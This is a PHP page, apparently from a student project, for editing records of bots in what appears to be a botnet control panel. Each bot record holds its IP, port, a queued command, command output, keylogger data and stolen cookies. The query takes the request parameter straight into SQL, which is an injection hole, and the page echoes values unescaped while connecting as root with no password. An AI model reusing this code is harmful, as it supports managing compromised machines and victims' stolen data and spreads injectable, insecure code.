<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cập nhật Bot</title>
    <style>
        form {
            display: flex;
            flex-direction: column;
        }

        ul {
            list-style: none;
        }

        li {
            display: inline-block;
        }
    </style>
</head>

<body>
    <?php
    $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
    mysqli_select_db($link, "pbl4");
    $ip = $_REQUEST['bot'];
    $sql = "SELECT * FROM botes WHERE ip='$ip'";
    $result = mysqli_query($link, $sql);
    $row = mysqli_fetch_assoc($result);
    ?>
    <form action="handleUpdateBot.php?IDBot=<?php echo $row['ID']; ?>" method="POST" name="formUpdateBot">
        <ul class="ul_update">
            <li class="li_update">
                <label for="">ID</label>
            </li>
            <li class="li_update">
                <input type="text" readonly value="<?php echo $row['ID']; ?>">
            </li>
        </ul>
        <ul class="ul_update">
            <li class="li_update">
                <label for="">IP</label>
            </li>
            <li class="li_update">
                <input type="text" name="ipBot" value="
                    <?php
                    echo $row['ip'];
                    ?>
                ">
            </li>
        </ul>
        <ul class="ul_update">
            <li class="li_update">
                <label for="">Port</label>
            </li>
            <li class="li_update">
                <input type="text" name="portBot" value="
                    <?php
                    echo $row['port'];
                    ?>
                ">
            </li>
        </ul>
        <ul class="ul_update">
            <li class="li_update">
                <label for="">Cmd</label>
            </li>
            <li class="li_update">
                <input type="text" name="cmdBot" value="
                    <?php
                    echo $row['cmd'];
                    ?>
                ">
            </li>
        </ul>
        <ul class="ul_update">
            <li class="li_update">
                <label for="">Return Cmd</label>
            </li>
            <li class="li_update">
                <input type="text" name="retstrBot" value="
                    <?php
                    echo $row['retstr'];
                    ?>
                ">
            </li>
        </ul>
        <ul class="ul_update">
            <li class="li_update">
                <label for="">Keylogger</label>
            </li>
            <li class="li_update">
                <input type="text" name="keyloggerBot" value="
                    <?php
                    echo $row['keylogger'];
                    ?>
                ">
            </li>
        </ul>
        <ul class="ul_update">
            <li class="li_update">
                <label for="">Cookies</label>
            </li>
            <li class="li_update">
                <input type="text" name="cookiesBot" value="
                    <?php
                    echo $row['cookies'];
                    mysqli_free_result($result);
                    mysqli_close($link);
                    ?>
                ">
            </li>
        </ul>
      
        <ul class="ul_update">
            <li class="li_update">
                <input type="submit" name="butUpdate" value="Cập nhật">
            </li>
        </ul>
    </form>
</body>

</html>